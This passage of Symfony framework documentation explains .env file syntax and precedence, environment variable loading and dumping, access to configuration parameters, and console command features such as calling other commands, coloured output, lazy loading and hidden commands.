    clear the Symfony cache or restart the PHP container if you're using Docker.

.env File Syntax
................

Add comments by prefixing them with ``#``:

.. code-block:: bash

    # database credentials
    DB_USER=root
    DB_PASS=pass # this is the secret password

Use environment variables in values by prefixing variables with ``$``:

.. code-block:: bash

    DB_USER=root
    DB_PASS=${DB_USER}pass # include the user as a password prefix

.. caution::

    The order is important when some env var depends on the value of other env
    vars. In the above example, ``DB_PASS`` must be defined after ``DB_USER``.
    Moreover, if you define multiple ``.env`` files and put ``DB_PASS`` first,
    its value will depend on the ``DB_USER`` value defined in other files
    instead of the value defined in this file.

Define a default value in case the environment variable is not set:

.. code-block:: bash

    DB_USER=
    DB_PASS=${DB_USER:-root}pass # results in DB_PASS=rootpass

Embed commands via ``$()`` (not supported on Windows):

.. code-block:: bash

    START_TIME=$(date)

.. caution::

    Using ``$()`` might not work depending on your shell.

.. tip::

    As a ``.env`` file is a regular shell script, you can ``source`` it in
    your own shell scripts:

    .. code-block:: terminal

        $ source .env

.. _configuration-multiple-env-files:

Overriding Environment Values via .env.local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to override an environment value (e.g. to a different value on your
local machine), you can do that in a ``.env.local`` file:

.. code-block:: bash

    # .env.local
    DATABASE_URL="mysql://root:@127.0.0.1:3306/my_database_name"

This file should be ignored by git and should *not* be committed to your repository.
Several other ``.env`` files are available to set environment variables in *just*
the right situation:

* ``.env``: defines the default values of the env vars needed by the application;
* ``.env.local``: overrides the default values for all environments but only on
  the machine which contains the file. This file should not be committed to the
  repository and it's ignored in the ``test`` environment (because tests should
  produce the same results for everyone);
* ``.env.<environment>`` (e.g. ``.env.test``): overrides env vars only for one
  environment but for all machines (these files *are* committed);
* ``.env.<environment>.local`` (e.g. ``.env.test.local``): defines machine-specific
  env var overrides only for one environment. It's similar to ``.env.local``,
  but the overrides only apply to one environment.

*Real* environment variables always win over env vars created by any of the
``.env`` files. Note that this behavior depends on the
`variables_order <http://php.net/manual/en/ini.core.php#ini.variables-order>`_
configuration, which must contain an ``E`` to expose the ``$_ENV`` superglobal.
This is the default configuration in PHP.

The ``.env`` and ``.env.<environment>`` files should be committed to the
repository because they are the same for all developers and machines. However,
the env files ending in ``.local`` (``.env.local`` and ``.env.<environment>.local``)
**should not be committed** because only you will use them. In fact, the
``.gitignore`` file that comes with Symfony prevents them from being committed.

Overriding Environment Variables Defined By The System
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to override an environment variable defined by the system, use the
``overrideExistingVars`` parameter defined by the
:method:`Symfony\\Component\\Dotenv\\Dotenv::loadEnv`,
:method:`Symfony\\Component\\Dotenv\\Dotenv::bootEnv`, and
:method:`Symfony\\Component\\Dotenv\\Dotenv::populate` methods::

    use Symfony\Component\Dotenv\Dotenv;

    $dotenv = new Dotenv();
    $dotenv->loadEnv(__DIR__.'/.env', overrideExistingVars: true);

    // ...

This will override environment variables defined by the system but it **won't**
override environment variables defined in ``.env`` files.

.. _configuration-env-var-in-prod:

Configuring Environment Variables in Production
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In production, the ``.env`` files are also parsed and loaded on each request. So
the easiest way to define env vars is by creating a ``.env.local`` file on your
production server(s) with your production values.

To improve performance, you can optionally run the ``dump-env`` Composer command:

.. code-block:: terminal

    # parses ALL .env files and dumps their final values to .env.local.php
    $ composer dump-env prod

.. sidebar:: Dumping Environment Variables without Composer

    If you don't have Composer installed in production, you can use the
    ``dotenv:dump`` command instead (available in :ref:`Symfony Flex <symfony-flex>`
    1.2 or later). The command is not registered by default, so you must register
    first in your services:

    .. code-block:: yaml

        # config/services.yaml
        services:
            Symfony\Component\Dotenv\Command\DotenvDumpCommand: ~

    Then, run the command:

    .. code-block:: terminal

        # parses ALL .env files and dumps their final values to .env.local.php
        $ APP_ENV=prod APP_DEBUG=0 php bin/console dotenv:dump

After running this command, Symfony will load the ``.env.local.php`` file to
get the environment variables and will not spend time parsing the ``.env`` files.

.. tip::

    Update your deployment tools/workflow to run the ``dotenv:dump`` command after
    each deploy to improve the application performance.

Storing Environment Variables In Other Files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, the environment variables are stored in the ``.env`` file located
at the root of your project. However, you can store them in other files in
multiple ways.

If you use the :doc:`Runtime component </components/runtime>`, the dotenv
path is part of the options you can set in your ``composer.json`` file:

.. code-block:: json

      {
          // ...
          "extra": {
              // ...
              "runtime": {
                  "dotenv_path": "my/custom/path/to/.env"
              }
          }
      }

You can also set the ``SYMFONY_DOTENV_PATH`` environment variable at system
level (e.g. in your web server configuration or in your Dockerfile):

.. code-block:: bash

    # .env (or .env.local)
    SYMFONY_DOTENV_PATH=my/custom/path/to/.env

Finally, you can directly invoke the ``Dotenv`` class in your
``bootstrap.php`` file or any other file of your application::

    use Symfony\Component\Dotenv\Dotenv;

    (new Dotenv())->bootEnv(dirname(__DIR__).'my/custom/path/to/.env');

Symfony will then look for the environment variables in that file, but also in
the local and environment-specific files (e.g. ``.*.local`` and
``.*.<environment>.local``). Read
:ref:`how to override environment variables <configuration-multiple-env-files>`
to learn more about this.

.. versionadded:: 7.1

    The ``SYMFONY_DOTENV_PATH`` environment variable was introduced in Symfony 7.1.

.. _configuration-secrets:

Encrypting Environment Variables (Secrets)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of defining a real environment variable or adding it to a ``.env`` file,
if the value of a variable is sensitive (e.g. an API key or a database password),
you can encrypt the value using the :doc:`secrets management system </configuration/secrets>`.

Listing Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use the ``debug:dotenv`` command to understand how Symfony parses the different
``.env`` files to set the value of each environment variable:

.. code-block:: terminal

    $ php bin/console debug:dotenv

    Dotenv Variables & Files
    ========================

    Scanned Files (in descending priority)
    --------------------------------------

    * ⨯ .env.local.php
    * ⨯ .env.dev.local
    * ✓ .env.dev
    * ⨯ .env.local
    * ✓ .env

    Variables
    ---------

    ---------- ------- ---------- ------
     Variable   Value   .env.dev   .env
    ---------- ------- ---------- ------
     FOO        BAR     n/a        BAR
     ALICE      BOB     BOB        bob
    ---------- ------- ---------- ------

    # look for a specific variable passing its full or partial name as an argument
    $ php bin/console debug:dotenv foo

Additionally, and regardless of how you set environment variables, you can see all
environment variables, with their values, referenced in Symfony's container configuration,
you can also see the number of occurrences of each environment variable in the container:

.. code-block:: terminal

    $ php bin/console debug:container --env-vars

    ------------ ----------------- ------------------------------------ -------------
     Name         Default value     Real value                           Usage count
    ------------ ----------------- ------------------------------------ -------------
     APP_SECRET   n/a               "471a62e2d601a8952deb186e44186cb3"   2
     BAR          n/a               n/a                                  1
     BAZ          n/a               "value"                              0
     FOO          "[1, "2.5", 3]"   n/a                                  1
    ------------ ----------------- ------------------------------------ -------------

    # you can also filter the list of env vars by name:
    $ php bin/console debug:container --env-vars foo

    # run this command to show all the details for a specific env var:
    $ php bin/console debug:container --env-var=FOO

Creating Your Own Logic To Load Env Vars
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can implement your own logic to load environment variables if the default
Symfony behavior doesn't fit your needs. To do so, create a service whose class
implements :class:`Symfony\\Component\\DependencyInjection\\EnvVarLoaderInterface`.

.. note::

    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
    the autoconfiguration feature will enable and tag this service automatically.
    Otherwise, you need to register and :doc:`tag your service </service_container/tags>`
    with the ``container.env_var_loader`` tag.

Let's say you have a JSON file named ``env.json`` containing your environment
variables:

.. code-block:: json

    {
        "vars": {
            "APP_ENV": "prod",
            "APP_DEBUG": false
        }
    }

You can define a class like the following ``JsonEnvVarLoader`` to populate the
environment variables from the file::

    namespace App\DependencyInjection;

    use Symfony\Component\DependencyInjection\EnvVarLoaderInterface;

    final class JsonEnvVarLoader implements EnvVarLoaderInterface
    {
        private const ENV_VARS_FILE = 'env.json';

        public function loadEnvVars(): array
        {
            $fileName = __DIR__.\DIRECTORY_SEPARATOR.self::ENV_VARS_FILE;
            if (!is_file($fileName)) {
                // throw an exception or just ignore this loader, depending on your needs
            }

            $content = json_decode(file_get_contents($fileName), true);

            return $content['vars'];
        }
    }

That's it! Now the application will look for a ``env.json`` file in the
current directory to populate environment variables (in addition to the
already existing ``.env`` files).

.. tip::

    If you want an env var to have a value on a certain environment but to fallback
    on loaders on another environment, assign an empty value to the env var for
    the environment you want to use loaders:

    .. code-block:: bash

        # .env (or .env.local)
        APP_ENV=prod

        # .env.prod (or .env.prod.local) - this will fallback on the loaders you defined
        APP_ENV=

.. _configuration-accessing-parameters:

Accessing Configuration Parameters
----------------------------------

Controllers and services can access all the configuration parameters. This
includes both the :ref:`parameters defined by yourself <configuration-parameters>`
and the parameters created by packages/bundles. Run the following command to see
all the parameters that exist in your application:

.. code-block:: terminal

    $ php bin/console debug:container --parameters

In controllers extending from the :ref:`AbstractController <the-base-controller-class-services>`,
use the ``getParameter()`` helper::

    // src/Controller/UserController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class UserController extends AbstractController
    {
        // ...

        public function index(): Response
        {
            $projectDir = $this->getParameter('kernel.project_dir');
            $adminEmail = $this->getParameter('app.admin_email');

            // ...
        }
    }

In services and controllers not extending from ``AbstractController``, inject
the parameters as arguments of their constructors. You must inject them
explicitly because :doc:`service autowiring </service_container/autowiring>`
doesn't work for parameters:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            app.contents_dir: '...'

        services:
            App\Service\MessageGenerator:
                arguments:
                    $contentsDir: '%app.contents_dir%'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <parameter key="app.contents_dir">...</parameter>
            </parameters>

            <services>
                <service id="App\Service\MessageGenerator">
                    <argument key="$contentsDir">%app.contents_dir%</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;

        return static function (ContainerConfigurator $container): void {
            $container->parameters()
                ->set('app.contents_dir', '...');

            $container->services()
                ->get(MessageGenerator::class)
                    ->arg('$contentsDir', '%app.contents_dir%');
        };

If you inject the same parameters over and over again, use the
``services._defaults.bind`` option instead. The arguments defined in that option are
injected automatically whenever a service constructor or controller action
defines an argument with that exact name. For example, to inject the value of the
:ref:`kernel.project_dir parameter <configuration-kernel-project-directory>`
whenever a service/controller defines a ``$projectDir`` argument, use this:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            _defaults:
                bind:
                    # pass this value to any $projectDir argument for any service
                    # that's created in this file (including controller arguments)
                    $projectDir: '%kernel.project_dir%'

            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <defaults autowire="true" autoconfigure="true" public="false">
                    <!-- pass this value to any $projectDir argument for any service
                         that's created in this file (including controller arguments) -->
                    <bind key="$projectDir">%kernel.project_dir%</bind>
                </defaults>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->services()
                ->defaults()
                    // pass this value to any $projectDir argument for any service
                    // that's created in this file (including controller arguments)
                    ->bind('$projectDir', '%kernel.project_dir%');

            // ...
        };

.. seealso::

    Read the article about :ref:`binding arguments by name and/or type <services-binding>`
    to learn more about this powerful feature.

Finally, if some service needs access to lots of parameters, instead of
injecting each of them individually, you can inject all the application
parameters at once by type-hinting any of its constructor arguments with the
:class:`Symfony\\Component\\DependencyInjection\\ParameterBag\\ContainerBagInterface`::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    // ...

    use Symfony\Component\DependencyInjection\ParameterBag\ContainerBagInterface;

    class MessageGenerator
    {
        public function __construct(
            private ContainerBagInterface $params,
        ) {
        }

        public function someMethod(): void
        {
            // get any container parameter from $this->params, which stores all of them
            $sender = $this->params->get('mailer_sender');
            // ...
        }
    }

.. _config-config-builder:

Using PHP ConfigBuilders
------------------------

Writing PHP config is sometimes difficult because you end up with large nested
arrays and you have no autocompletion help from your favorite IDE. A way to
address this is to use "ConfigBuilders". They are objects that will help you
build these arrays.

Symfony generates the ConfigBuilder classes automatically in the
:ref:`kernel build directory <configuration-kernel-build-directory>` for all the
bundles installed in your application. By convention they all live in the
namespace ``Symfony\Config``::

    // config/packages/security.php
    use Symfony\Config\SecurityConfig;

    return static function (SecurityConfig $security): void {
        $security->firewall('main')
            ->pattern('^/*')
            ->lazy(true)
            ->security(false);

        $security
            ->roleHierarchy('ROLE_ADMIN', ['ROLE_USER'])
            ->roleHierarchy('ROLE_SUPER_ADMIN', ['ROLE_ADMIN', 'ROLE_ALLOWED_TO_SWITCH'])
            ->accessControl()
                ->path('^/user')
                ->roles('ROLE_USER');

        $security->accessControl(['path' => '^/admin', 'roles' => 'ROLE_ADMIN']);
    };

.. note::

    Only root classes in the namespace ``Symfony\Config`` are ConfigBuilders.
    Nested configs (e.g. ``\Symfony\Config\Framework\CacheConfig``) are regular
    PHP objects which aren't autowired when using them as an argument type.

.. note::

    In order to get ConfigBuilders autocompletion in your IDE/editor, make sure
    to not exclude the directory where these classes are generated (by default,
    in ``var/cache/dev/Symfony/Config/``).

Keep Going!
-----------

Congratulations! You've tackled the basics of Symfony. Next, learn about *each*
part of Symfony individually by following the guides. Check out:

* :doc:`/forms`
* :doc:`/doctrine`
* :doc:`/service_container`
* :doc:`/security`
* :doc:`/mailer`
* :doc:`/logging`

And all the other topics related to configuration:

.. toctree::
    :maxdepth: 1
    :glob:

    configuration/*

.. _`Learn the XML syntax`: https://en.wikipedia.org/wiki/XML
.. _`environment variables`: https://en.wikipedia.org/wiki/Environment_variable
.. _`symbolic links`: https://en.wikipedia.org/wiki/Symbolic_link
.. _`utilities to manage env vars`: https://symfony.com/doc/current/cloud/env.html
Using Parameters within a Dependency Injection Class
----------------------------------------------------

You have seen how to use configuration parameters within
:ref:`Symfony service containers <service-container-parameters>`.
There are special cases such as when you want, for instance, to use the
``%kernel.debug%`` parameter to make the services in your bundle enter
debug mode. For this case there is more work to do in order
to make the system understand the parameter value. By default,
your parameter ``%kernel.debug%`` will be treated as a string. Consider the
following example::

    // inside Configuration class
    $rootNode
        ->children()
            ->booleanNode('logging')->defaultValue('%kernel.debug%')->end()
            // ...
        ->end()
    ;

    // inside the Extension class
    $config = $this->processConfiguration($configuration, $configs);
    var_dump($config['logging']);

Now, examine the results to see this closely:

.. configuration-block::

    .. code-block:: yaml

        my_bundle:
            logging: true
            # true, as expected

        my_bundle:
            logging: '%kernel.debug%'
            # true/false (depends on 2nd argument of the Kernel class),
            # as expected, because %kernel.debug% inside configuration
            # gets evaluated before being passed to the extension

        my_bundle: ~
        # passes the string "%kernel.debug%".
        # Which is always considered as true.
        # The Configurator does not know anything about
        # "%kernel.debug%" being a parameter.

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:my-bundle="http://example.org/schema/dic/my_bundle"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://example.org/schema/dic/my_bundle
                https://example.org/schema/dic/my_bundle/my_bundle-1.0.xsd">

            <my-bundle:config logging="true"/>
            <!-- true, as expected -->

            <my-bundle:config logging="%kernel.debug%"/>
            <!-- true/false (depends on 2nd parameter of Kernel),
                 as expected, because %kernel.debug% inside configuration
                 gets evaluated before being passed to the extension -->

            <my-bundle:config/>
            <!-- passes the string "%kernel.debug%".
                 Which is always considered as true.
                 The Configurator does not know anything about
                 "%kernel.debug%" being a parameter. -->
        </container>

    .. code-block:: php

        $container->loadFromExtension('my_bundle', [
                'logging' => true,
                // true, as expected
            ]
        );

        $container->loadFromExtension('my_bundle', [
                'logging' => "%kernel.debug%",
                // true/false (depends on 2nd parameter of Kernel),
                // as expected, because %kernel.debug% inside configuration
                // gets evaluated before being passed to the extension
            ]
        );

        $container->loadFromExtension('my_bundle');
        // passes the string "%kernel.debug%".
        // Which is always considered as true.
        // The Configurator does not know anything about
        // "%kernel.debug%" being a parameter.

In order to support this use case, the ``Configuration`` class has to
be injected with this parameter via the extension as follows::

    namespace App\DependencyInjection;

    use Symfony\Component\Config\Definition\Builder\TreeBuilder;
    use Symfony\Component\Config\Definition\ConfigurationInterface;

    class Configuration implements ConfigurationInterface
    {
        private bool $debug;

        public function __construct(private bool $debug)
        {
        }

        public function getConfigTreeBuilder(): TreeBuilder
        {
            $treeBuilder = new TreeBuilder('my_bundle');

            $treeBuilder->getRootNode()
                ->children()
                    // ...
                    ->booleanNode('logging')->defaultValue($this->debug)->end()
                    // ...
                ->end()
            ;

            return $treeBuilder;
        }
    }

And set it in the constructor of ``Configuration`` via the ``Extension`` class::

    namespace App\DependencyInjection;

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\HttpKernel\DependencyInjection\Extension;

    class AppExtension extends Extension
    {
        // ...

        public function getConfiguration(array $config, ContainerBuilder $container): Configuration
        {
            return new Configuration($container->getParameter('kernel.debug'));
        }
    }

.. tip::

    There are some instances of ``%kernel.debug%`` usage within a
    ``Configurator`` class for example in TwigBundle. However, this is because
    the default parameter value is set by the Extension class.
How to Call Other Commands
==========================

If a command depends on another one being run before it you can call in the
console command itself. This is useful if a command depends on another command
or if you want to create a "meta" command that runs a bunch of other commands
(for instance, all commands that need to be run when the project's code has
changed on the production servers: clearing the cache, generating Doctrine
proxies, dumping web assets, ...).

Use the :method:`Symfony\\Component\\Console\\Application::doRun`. Then, create
a new :class:`Symfony\\Component\\Console\\Input\\ArrayInput` with the
arguments and options you want to pass to the command. The command name must be
the first argument.

Eventually, calling the ``doRun()`` method actually runs the command and returns
the returned code from the command (return value from command ``execute()``
method)::

    // ...
    use Symfony\Component\Console\Command;
    use Symfony\Component\Console\Input\ArrayInput;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class CreateUserCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $greetInput = new ArrayInput([
                // the command name is passed as first argument
                'command' => 'demo:greet',
                'name'    => 'Fabien',
                '--yell'  => true,
            ]);

            $returnCode = $this->getApplication()->doRun($greetInput, $output);

            // ...
        }
    }

.. tip::

    If you want to suppress the output of the executed command, pass a
    :class:`Symfony\\Component\\Console\\Output\\NullOutput` as the second
    argument to ``$application->doRun()``.

.. note::

    Using ``doRun()`` instead of ``run()`` prevents autoexiting and allows to
    return the exit code instead.

    Also, using ``$this->getApplication()->doRun()`` instead of
    ``$this->getApplication()->find('demo:greet')->run()`` will allow proper
    events to be dispatched for that inner command as well.

.. caution::

    Note that all the commands will run in the same process and some of Symfony's
    built-in commands may not work well this way. For instance, the ``cache:clear``
    and ``cache:warmup`` commands change some class definitions, so running
    something after them is likely to break.

.. note::

    Most of the time, calling a command from code that is not executed on the
    command line is not a good idea. The main reason is that the command's
    output is optimized for the console and not to be passed to other commands.
How to Color and Style the Console Output
=========================================

Symfony provides an optional :doc:`console style </console/style>` to render the
input and output of commands in a consistent way. If you prefer to apply your
own style, use the utilities explained in this article to show colors in the command
output (e.g. to differentiate between important messages, titles, comments, etc.).

.. note::

    By default, the Windows command console doesn't support output coloring. The
    Console component disables output coloring for Windows systems, but if your
    commands invoke other scripts which emit color sequences, they will be
    wrongly displayed as raw escape characters. Install the `Cmder`_, `ConEmu`_,
    `ANSICON`_, `Mintty`_ (used by default in GitBash and Cygwin) or `Hyper`_
    free applications to add coloring support to your Windows command console.

Using Color Styles
------------------

Whenever you output text, you can surround the text with tags to color its
output. For example::

    // green text
    $output->writeln('<info>foo</info>');

    // yellow text
    $output->writeln('<comment>foo</comment>');

    // black text on a cyan background
    $output->writeln('<question>foo</question>');

    // white text on a red background
    $output->writeln('<error>foo</error>');

The closing tag can be replaced by ``</>``, which revokes all formatting options
established by the last opened tag.

It is possible to define your own styles using the
:class:`Symfony\\Component\\Console\\Formatter\\OutputFormatterStyle` class::

    use Symfony\Component\Console\Formatter\OutputFormatterStyle;

    // ...
    $outputStyle = new OutputFormatterStyle('red', '#ff0', ['bold', 'blink']);
    $output->getFormatter()->setStyle('fire', $outputStyle);

    $output->writeln('<fire>foo</>');

Any hex color is supported for foreground and background colors. Besides that, these named colors are supported:
``black``, ``red``, ``green``, ``yellow``, ``blue``, ``magenta``, ``cyan``, ``white``,
``gray``, ``bright-red``, ``bright-green``, ``bright-yellow``, ``bright-blue``,
``bright-magenta``, ``bright-cyan`` and ``bright-white``.

.. note::

    If the terminal doesn't support true colors, the given color is replaced by
    the nearest color depending on the terminal capabilities. E.g. ``#c0392b`` is
    degraded to ``#d75f5f`` in 256-color terminals and to ``red`` in 8-color terminals.

And available options are: ``bold``, ``underscore``, ``blink``, ``reverse``
(enables the "reverse video" mode where the background and foreground colors
are swapped) and ``conceal`` (sets the foreground color to transparent, making
the typed text invisible - although it can be selected and copied; this option is
commonly used when asking the user to type sensitive information).

You can also set these colors and options directly inside the tag name::

    // using named colors
    $output->writeln('<fg=green>foo</>');

    // using hexadecimal colors
    $output->writeln('<fg=#c0392b>foo</>');

    // black text on a cyan background
    $output->writeln('<fg=black;bg=cyan>foo</>');

    // bold text on a yellow background
    $output->writeln('<bg=yellow;options=bold>foo</>');

    // bold text with underscore
    $output->writeln('<options=bold,underscore>foo</>');

.. note::

    If you need to render a tag literally, escape it with a backslash: ``\<info>``
    or use the :method:`Symfony\\Component\\Console\\Formatter\\OutputFormatter::escape`
    method to escape all the tags included in the given string.

Displaying Clickable Links
~~~~~~~~~~~~~~~~~~~~~~~~~~

Commands can use the special ``<href>`` tag to display links similar to the
``<a>`` elements of web pages::

    $output->writeln('<href=https://symfony.com>Symfony Homepage</>');

If your terminal belongs to the `list of terminal emulators that support links`_
you can click on the *"Symfony Homepage"* text to open its URL in your default
browser. Otherwise, you'll see *"Symfony Homepage"* as regular text and the URL
will be lost.

.. _Cmder: https://github.com/cmderdev/cmder
.. _ConEmu: https://conemu.github.io/
.. _ANSICON: https://github.com/adoxa/ansicon/releases
.. _Mintty: https://mintty.github.io/
.. _Hyper: https://hyper.is/
.. _`list of terminal emulators that support links`: https://gist.github.com/egmontkob/eb114294efbcd5adb1944c9f3cb5feda
How to Call a Command from a Controller
=======================================

The :doc:`Console component documentation </components/console>` covers how to
create a console command. This article covers how to use a console command
directly from your controller.

You may have the need to call some function that is only available in a console
command. Usually, you should refactor the command and move some logic into a
service that can be reused in the controller. However, when the command is part
of a third-party library, you don't want to modify or duplicate their code.
Instead, you can run the command directly from the controller.

.. caution::

    In comparison with a direct call from the console, calling a command from
    a controller has a slight performance impact because of the request stack
    overhead.

Imagine you want to run the ``debug:twig`` from inside your controller::

    // src/Controller/DebugTwigController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Console\Application;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\Console\Input\ArrayInput;
    use Symfony\Component\Console\Output\BufferedOutput;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\KernelInterface;

    class DebugTwigController extends AbstractController
    {
        public function debugTwig(KernelInterface $kernel): Response
        {
            $application = new Application($kernel);
            $application->setAutoExit(false);

            $input = new ArrayInput([
                'command' => 'debug:twig',
                // (optional) define the value of command arguments
                'fooArgument' => 'barValue',
                // (optional) pass options to the command
                '--bar' => 'fooValue',
                // (optional) pass options without value
                '--baz' => true,
            ]);

            // You can use NullOutput() if you don't need the output
            $output = new BufferedOutput();
            $application->run($input, $output);

            // return the output, don't use if you used NullOutput()
            $content = $output->fetch();

            // return new Response(""), if you used NullOutput()
            return new Response($content);
        }
    }

Showing Colorized Command Output
--------------------------------

By telling the :class:`Symfony\\Component\\Console\\Output\\BufferedOutput`
it is decorated via the second parameter, it will return the Ansi color-coded
content. The `SensioLabs AnsiToHtml converter`_ can be used to convert this to
colorful HTML.

First, require the package:

.. code-block:: terminal

    $ composer require sensiolabs/ansi-to-html

Now, use it in your controller::

    // src/Controller/DebugTwigController.php
    namespace App\Controller;

    use SensioLabs\AnsiConverter\AnsiToHtmlConverter;
    use Symfony\Component\Console\Output\BufferedOutput;
    use Symfony\Component\Console\Output\OutputInterface;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    class DebugTwigController extends AbstractController
    {
        public function sendSpool(int $messages = 10): Response
        {
            // ...
            $output = new BufferedOutput(
                OutputInterface::VERBOSITY_NORMAL,
                true // true for decorated
            );
            // ...

            // return the output
            $converter = new AnsiToHtmlConverter();
            $content = $output->fetch();

            return new Response($converter->convert($content));
        }
    }

The ``AnsiToHtmlConverter`` can also be registered `as a Twig Extension`_,
and supports optional themes.

.. _`SensioLabs AnsiToHtml converter`: https://github.com/sensiolabs/ansi-to-html
.. _`as a Twig Extension`: https://github.com/sensiolabs/ansi-to-html#twig-integration
How to Define Commands as Services
==================================

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
your command classes are already registered as services. Great! This is the
recommended setup.

.. note::

    You can also manually register your command as a service by configuring the service
    and :doc:`tagging it </service_container/tags>` with ``console.command``.

For example, suppose you want to log something from within your command::

    namespace App\Command;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\Console\Attribute\AsCommand;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    #[AsCommand(name: 'app:sunshine')]
    class SunshineCommand extends Command
    {
        public function __construct(
            private LoggerInterface $logger,
        ) {
            // you *must* call the parent constructor
            parent::__construct();
        }

        protected function configure(): void
        {
            $this
                ->setDescription('Good morning!');
        }

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $this->logger->info('Waking up the sun');
            // ...

            return Command::SUCCESS;
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
the command class will automatically be registered as a service and passed the ``$logger``
argument (thanks to autowiring). In other words, you only need to create this
class and everything works automatically! You can call the ``app:sunshine``
command and start logging.

.. caution::

    You *do* have access to services in ``configure()``. However, if your command is
    not :ref:`lazy <console-command-service-lazy-loading>`, try to avoid doing any
    work (e.g. making database queries), as that code will be run, even if you're using
    the console to execute a different command.

.. _console-command-service-lazy-loading:

Lazy Loading
------------

To make your command lazily loaded, either define its name using the PHP
``AsCommand`` attribute::

    use Symfony\Component\Console\Attribute\AsCommand;
    // ...

    #[AsCommand(name: 'app:sunshine')]
    class SunshineCommand extends Command
    {
        // ...
    }

Or set the ``command`` attribute on the ``console.command`` tag in your service definition:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Command\SunshineCommand:
                tags:
                    - { name: 'console.command', command: 'app:sunshine' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Command\SunshineCommand">
                    <tag name="console.command" command="app:sunshine"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Command\SunshineCommand;

        // ...
        $container->register(SunshineCommand::class)
            ->addTag('console.command', ['command' => 'app:sunshine'])
        ;

.. note::

    If the command defines aliases (using the
    :method:`Symfony\\Component\\Console\\Command\\Command::getAliases` method)
    you must add one ``console.command`` tag per alias.

That's it. One way or another, the ``SunshineCommand`` will be instantiated
only when the ``app:sunshine`` command is actually called.

.. note::

    You don't need to call ``setName()`` for configuring the command when it is lazy.

.. caution::

    Calling the ``list`` command will instantiate all commands, including lazy commands.
    However, if the command is a ``Symfony\Component\Console\Command\LazyCommand``, then
    the underlying command factory will not be executed.
How to Hide Console Commands
============================

By default, all console commands are listed when executing the console application
script without arguments or when using the ``list`` command.

However, sometimes commands are not intended to be run by end-users; for
example, commands for the legacy parts of the application, commands exclusively
run through scheduled tasks, etc.

In those cases, you can define the command as **hidden** by setting to ``true``
the ``hidden`` property of the ``AsCommand`` attribute::

    // src/Command/LegacyCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Attribute\AsCommand;
    use Symfony\Component\Console\Command\Command;

    #[AsCommand(name: 'app:legacy', hidden: true)]
    class LegacyCommand extends Command
    {
        // ...
    }

Hidden commands behave the same as normal commands but they are no longer displayed
in command listings, so end-users are not aware of their existence.

.. note::

    Hidden commands are still available using the JSON or XML descriptor.
Console Input (Arguments & Options)
===================================

The most interesting part of the commands are the arguments and options that
you can make available. These arguments and options allow you to pass dynamic
information from the terminal to the command.

Using Command Arguments
-----------------------

Arguments are the strings - separated by spaces - that
come after the command name itself. They are ordered, and can be optional
or required. For example, to add an optional ``last_name`` argument to the command
and make the ``name`` argument required::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputArgument;

    class GreetCommand extends Command
    {
        // ...

        protected function configure(): void
        {
            $this
